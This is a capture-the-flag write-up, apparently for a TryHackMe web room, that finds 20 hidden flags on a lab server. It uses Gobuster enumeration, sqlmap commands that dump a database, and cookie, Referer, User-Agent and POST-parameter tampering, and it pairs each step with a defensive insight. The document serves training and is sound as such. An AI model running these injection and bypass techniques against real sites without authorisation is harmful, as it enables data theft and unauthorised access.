# 🌐 CTF Collection Vol.2

> Category: Web Security
> Difficulty: Medium

---

## 📌 Overview

This room focuses on various web exploitation techniques commonly encountered in Capture The Flag (CTF) challenges and real-world web application assessments.

The room contains 20 hidden “Easter Eggs” (flags) spread across different web vulnerabilities and misconfigurations including:

* Hidden files and directories
* Source code disclosure
* SQL Injection
* HTTP header manipulation
* Cookie tampering
* User-Agent spoofing
* POST data manipulation
* Encoding/decoding
* JavaScript analysis
* Base64 image extraction

---

## 🎯 Objectives

* Practice web enumeration techniques
* Learn common HTTP header manipulation attacks
* Understand how hidden content can leak sensitive data
* Practice SQL Injection exploitation using automation tools
* Improve familiarity with Burp Suite, Gobuster, Curl, CyberChef, and SQLMap

---

# 🥚 Easter 1 — Robots.txt Enumeration

## 🧪 Enumeration

Visited:

```bash
http://10.114.190.139/robots.txt
```

Contents discovered:

```txt
User-agent: *
Disallow: /VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=

45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
```

---

## 🔍 Analysis

The first string was a multilayer Base64-encoded string.

Using [CyberChef](https://gchq.github.io/CyberChef/?utm_source=chatgpt.com) revealed:

```txt
DesKel_secret_base
```

The second string was hexadecimal encoded.

Decoded hex output:

```txt
Easter 1: THM{4u70b07_r0ll_0u7}
```

---

## 🏁 Flag

```txt
THM{4u70b07_r0ll_0u7}
```

---

## 🛡️ Security Insight

Attackers frequently inspect `robots.txt` for hidden directories, backups, and sensitive endpoints accidentally exposed by developers.

---

## ⚔️ Offensive Security Relevance

Robots.txt enumeration is a foundational reconnaissance technique used during web application assessments and bug bounty engagements.

---

# 🥚 Easter 2 — Source Code Disclosure

## 🧪 Enumeration

Visited the decoded directory:

```bash
http://10.114.190.139/DesKel_secret_base/
```

The page appeared blank.

Viewed source code and found:

```html
<p style="text-align:center;color:white;">Easter 2: THM{f4ll3n_b***}</p>
```

---

## 🏁 Flag

```txt
THM{f4ll3n_b***}
```

---

## 🛡️ Security Insight

Sensitive information hidden in HTML comments or invisible elements is still accessible to attackers through source inspection.

---

## ⚔️ Offensive Security Relevance

Source code analysis is critical during web pentests since developers often expose secrets unintentionally.

---

# 🥚 Easter 3 — Directory Bruteforcing

## 🧪 Enumeration

Hint suggested using Gobuster.

Command used:

```bash
gobuster dir -u http://10.114.190.139/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

Interesting discovery:

```txt
/login
```

Visited the page and inspected the source code.

Found:

```html
<p hidden>
Seriously! You think the php script inside the source code?
Pfff.. take this easter 3:
THM{y0u_c4n'7_533_m3}
</p>
```

---

## 🏁 Flag

```txt
THM{y0u_c4n'7_533_m3}
```

---

## 🛡️ Security Insight

Hidden HTML elements are not secure storage mechanisms.

---

## ⚔️ Offensive Security Relevance

Directory brute-forcing is one of the most effective reconnaissance methods for discovering hidden attack surfaces.

---

# 🥚 Easter 4 — Time-Based SQL Injection

## 🧪 Exploitation

Captured login request using [Burp Suite](https://portswigger.net/burp?utm_source=chatgpt.com) and saved it as:

```txt
vol2.xml
```

Enumerated database:

```bash
sqlmap -r vol2.xml --current-db
```

Result:

```txt
THM_f0und_m3
```

Enumerated tables:

```bash
sqlmap -r vol2.xml -D THM_f0und_m3 --tables --dump
```

Interesting table:

```txt
nothing_inside
```

Dumped table contents:

```bash
sqlmap -r vol2.xml -D THM_f0und_m3 -T nothing_inside --dump
```

Found:

```txt
THM{1nj3c7_l1k3_4_b055}
```

---

## 🏁 Flag

```txt
THM{1nj3c7_l1k3_4_b055}
```

---

## 🛡️ Security Insight

Unsanitized SQL queries can allow attackers to fully enumerate and extract database contents.

---

## ⚔️ Offensive Security Relevance

SQL Injection remains one of the most dangerous web vulnerabilities and is still actively exploited in real-world attacks.

---

# 🥚 Easter 6 — HTTP Header Inspection

## 🧪 Enumeration

Used Curl to inspect HTTP headers:

```bash
curl -s http://10.114.190.139 -D data.txt
```

Viewed contents:

```bash
cat data.txt
```

Easter 6 was hidden within the headers.

---

## 🛡️ Security Insight

Sensitive information should never be exposed through HTTP headers.

---

## ⚔️ Offensive Security Relevance

Inspecting headers is a common recon technique used to identify leaked metadata and misconfigurations.

---

# 🥚 Easter 7 — Cookie Tampering

## 🧪 Exploitation

Modified cookie value from:

```txt
Invited=0
```

to:

```txt
Invited=1
```

Reloaded the page and Easter 7 appeared.

---

## 🛡️ Security Insight

Client-side authorization decisions using cookies are insecure and easily bypassed.

---

## ⚔️ Offensive Security Relevance

Cookie tampering is widely used during privilege escalation testing.

---

# 🥚 Easter 8 — User-Agent Spoofing

## 🧪 Exploitation

Used Curl with a mobile User-Agent:

```bash
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X)" http://10.113.165.144/
```

Easter 8 appeared in the response.

---

## 🛡️ Security Insight

Applications should never trust User-Agent headers for access control.

---

## ⚔️ Offensive Security Relevance

Header spoofing is frequently used to bypass weak filtering and detection systems.

---

# 🥚 Easter 9 — Fast Redirect Analysis

## 🧪 Enumeration

Observed rapid redirect:

```
/ready/ → /ready/gone.php
```

Used:

```
view-source:http://10.113.165.144/ready/
```

The source code revealed Easter 9.

---

## 🛡️ Security Insight

Redirects may expose sensitive content before navigation completes.

---

## ⚔️ Offensive Security Relevance

Analyzing redirects can reveal hidden content, insecure logic, or leaked application states.

---

# 🥚 Easter 10 — Referer Header Spoofing

## 🧪 Exploitation

Used Curl to spoof Referer header:

```
curl -e "tryhackme.com" http://10.113.165.144/free_sub/
```

Easter 10 appeared in the response.

---

## 🛡️ Security Insight

Referer headers are fully controllable by the client and should never be trusted for authentication.

---

## ⚔️ Offensive Security Relevance

Referer manipulation is commonly used to bypass poorly implemented access controls.

---

# 🥚 Easter 11 — POST Data Tampering

## 🧪 Exploitation

Intercepted request using Burp Repeater.

Modified POST parameter to:

```
egg
```

even though it did not exist in the dropdown menu.

Response revealed Easter 11.

---

## 🛡️ Security Insight

Server-side validation must always enforce accepted values.

---

## ⚔️ Offensive Security Relevance

POST parameter tampering is heavily used during business logic testing.

---

# 🥚 Easter 12 — Fake JavaScript File

## 🧪 Enumeration

Viewed source code:

```txt
view-source:http://10.113.165.144/
```

Discovered suspicious JavaScript file:

```txt
jquery-9.1.2.js
```

Inside the file:

```javascript
str1 = '4561737465722031322069732054484d7b68316464336e5f6a355f66316c337d'
```

Decoded hex using CyberChef.

---

## 🏁 Flag

```
THM{h1dd3n_j5_f**3}
```

---

## 🛡️ Security Insight

Sensitive information should never be embedded inside client-side JavaScript.

---

## ⚔️ Offensive Security Relevance

JavaScript analysis is an essential part of modern web application assessments.

---

# 🥚 Easter 14 — Embedded Image Extraction

## 🧪 Analysis

Hint:

```
embedded image code
```

A Base64 string was discovered.

Using CyberChef:

1. Applied `From Base64`
2. Applied `Render Image`

The rendered image contained Easter 14.

---

## 🛡️ Security Insight

Attackers frequently inspect encoded blobs for hidden data and steganography.

---

## ⚔️ Offensive Security Relevance

Understanding encoding and embedded data extraction is valuable during forensic and web investigations.

---

# 🥚 Easter 15 — Hash & Alphabet Guessing

## 🧪 Analysis

Challenge focused on identifying encoded/hash-like patterns and performing educated guessing.

---

## ⚔️ Offensive Security Relevance

Recognizing common encoding and hashing schemes is critical during CTFs and real-world engagements.

---

# 🥚 Easter 16 — Parameter Manipulation

## 🧪 Exploitation

Captured POST request:

```
button1=button1&submit=submit
```

Modified request to include extra parameters:

```
button1=button1&button2=button2&button3=button3&submit=submit
```

Forwarded request and received Easter 16.

---

## 🛡️ Security Insight

Applications should validate unexpected parameters server-side.

---

## ⚔️ Offensive Security Relevance

Parameter pollution and hidden parameter testing are common web exploitation techniques.

---

# 🥚 Easter 17 — Binary Decoding

## 🧪 Analysis

Challenge required converting:

```
Binary → Decimal → Hex → ASCII
```

Used ChatGPT and CyberChef to decode the binary string.

Prompt used:

```
Take the following binary string and:

1. Split it into 8-bit bytes
2. Convert each byte to decimal
3. Convert each byte to hexadecimal
4. Convert the hexadecimal values to ASCII text
5. Show every step clearly in a table
6. Identify any non-printable characters
```

Successfully decoded Easter 17.

---

## ⚔️ Offensive Security Relevance

Encoding analysis is extremely common during malware analysis, CTFs, and incident response.

---

# 🥚 Easter 18 — Custom HTTP Header Injection

## 🧪 Exploitation

Intercepted request using Burp Suite.

Added custom header:

```txt
Egg: yes
```

Forwarded request and Easter 18 appeared.

---

## 🛡️ Security Insight

Applications relying on client-controlled headers for logic decisions are insecure.

---

## ⚔️ Offensive Security Relevance

Custom header manipulation is frequently used during API and web application testing.

---

# 🥚 Easter 19 — Hidden Resource Discovery

## 🧪 Enumeration

During Gobuster enumeration, discovered:

```txt
/small
```

Visiting the endpoint displayed an image containing Easter 19.

---

## 🛡️ Security Insight

Sensitive information hidden in media files can still be discovered through enumeration.

---

## ⚔️ Offensive Security Relevance

Enumeration often reveals forgotten or hidden resources useful for attackers.

---

# 🥚 Easter 20 — POST Credential Injection

## 🧪 Exploitation

Intercepted POST request and added credentials:

```txt
username=DesKel&password=heIsDumb
```

Forwarded request and Easter 20 appeared.

---

## 🛡️ Security Insight

Improper authentication logic and insecure parameter handling can expose sensitive functionality.

---

## ⚔️ Offensive Security Relevance

Authentication bypass testing is a critical component of offensive web security assessments.

---

# 🧠 Lessons Learned

* Always inspect `robots.txt`
* Source code often leaks sensitive information
* Hidden HTML elements are not secure
* SQL Injection remains highly dangerous
* HTTP headers can often be manipulated
* Cookies should never store authorization logic
* JavaScript files may expose secrets
* Burp Suite is essential for web testing
* Enumeration is one of the most important pentesting phases
* Encoding and decoding skills are crucial in CTFs

---

# 🛠️ Tools Used

* [Burp Suite](https://portswigger.net/burp)
* [Gobuster](https://github.com/OJ/gobuster)
* [SQLMap](https://sqlmap.org)
* [CyberChef](https://gchq.github.io/CyberChef/)
* Curl
* Browser Developer Tools

---

